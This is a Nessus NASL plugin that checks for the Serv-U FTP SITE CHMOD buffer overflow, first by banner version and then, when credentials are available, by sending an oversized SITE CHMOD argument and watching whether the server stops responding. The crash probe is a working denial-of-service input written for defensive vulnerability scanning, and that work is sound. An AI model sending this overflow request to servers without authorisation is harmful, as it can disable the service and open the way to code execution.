#
# Written by Astharot <astharot@zone-h.org>
# 
# Changes by Tenable:
# - Revised plugin title, added OSVDB refs, enhanced description (2/03/2009)
# - Modernized plugin, check for server response multiple times before finding vulnerable (6/28/2013)


include("compat.inc");

if(description)
{
 script_id(12037);
 script_version ("$Revision: 1.30 $");

 script_cve_id("CVE-2004-2111", "CVE-2004-2533");
 script_bugtraq_id(9483, 9675);
 script_osvdb_id(3713, 51701);
 
 script_name(english:"Serv-U SITE CHMOD Command Multiple Vulnerabilities");
	     
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Serv-U FTP Server. 

There is a bug in the way the server handles arguments to the SITE
CHMOD requests that could allow an attacker to trigger a buffer 
overflow or corrupt memory in the server and disable it remotely 
or to potentially execute arbitrary code on the host. 

Note that successful exploitation requires access to a writable
directory and will result in code running with Administrator or SYSTEM
privileges by default." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2004/Jan/249" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2004/Feb/918" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Serv-U FTP Server version 4.2 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Serv-U FTP Server Buffer Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"plugin_publication_date", value: "2004/02/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/01/24");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");
 script_set_attribute(attribute:"patch_publication_date", value: "2004/01/24");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe",value:"cpe:/a:serv-u:serv-u");
 script_end_attributes();
 
 script_summary(english:"Serv-U Stack Overflow");
 script_category(ACT_MIXED_ATTACK);
 script_family(english:"FTP");
 
 script_copyright(english:"This script is Copyright (C) 2004-2016 Astharot");
		  
 script_dependencie("find_service1.nasl", "ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
 script_require_keys("ftp/servu");
 script_require_ports("Services/ftp", 21);

 exit(0);
}

include("misc_func.inc");
include("global_settings.inc");
include("ftp_func.inc");

port = get_ftp_port(default: 21);

banner = get_ftp_banner(port:port);
if ( ! banner ) exit(0, "Unable to grab FTP banner for server on port " + port + ".");

matches = eregmatch(
  pattern:"^.*Serv-U FTP( |-Server | Server )v[ ]*(([0-9a-z-]+\.)+[0-9a-z]+)(.*$|$)", 
  string:banner, 
  icase:TRUE
);
if(isnull(matches) || isnull(matches[2]))
  exit(0, "Remote FTP server on port " + port + " is not Serv-U FTP.");

version = matches[2];

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if (!login || safe_checks()) {
  if(egrep(pattern:"Serv-U FTP[- ]Server v([0-3]|4\.[0-1])($|[^0-9])", string:banner)) {
    if(report_verbosity > 0)
   { 
     report =
     '\n  Installed Version : ' + version + 
     '\n  Fixed Version     : 4.2' +
     '\n' + 
     '\nNote that Nessus has determined the vulnerability exists on the remote' +
     '\nhost simply by looking at the software\'s banner.  To really check for' + 
     '\nthe vulnerability, disable safe_checks and re-run the scan.\n';
     security_hole(port:port, extra:report);
   }
   else security_hole(port);
   exit(0);
 }
 else exit(0, "The Serv-U FTP " +version+ " install listening on port " + port + " is not affected.");
}


if(login)
{
 soc = open_sock_tcp(port);
 if (!soc) exit(1, "Failed to open a socket on port "+port+".");
 
 to = get_read_timeout();

 if (! ftp_authenticate(socket:soc, user:login,pass:password))
   exit(1, "Could not log into the remote FTP server on port "+port+".");
 crp = crap(data:"a", length:2000);
 req = string("SITE CHMOD 0666  ", crp, "\r\n");
 send(socket:soc, data:req);
 
 vuln = TRUE;
 for (i=0; i<5; i++)
 {
   r = recv_line(socket:soc, length:4096, timeout:to);
   if(r)
   {
     vuln = FALSE;
     break;
   }
   sleep(1);
 }
 ftp_close(socket: soc);

 if(vuln)
 {
  if(report_verbosity > 0)
  {
    report =
    '\nNessus confirmed the vulnerability since it failed to receive any' +
    '\ndata from the server after 5 attempts post exploitation.\n';
    security_hole(extra:report, port:port);
  }
  else security_hole(port);
  exit(0);
 }
 else exit(0, "The Serv-U FTP " +version+ " install listening on port " + port + " is not affected.");
}
else exit(0, "No login credentials available to test vulnerability for " + 
             "FTP server on port " + port + "."); 
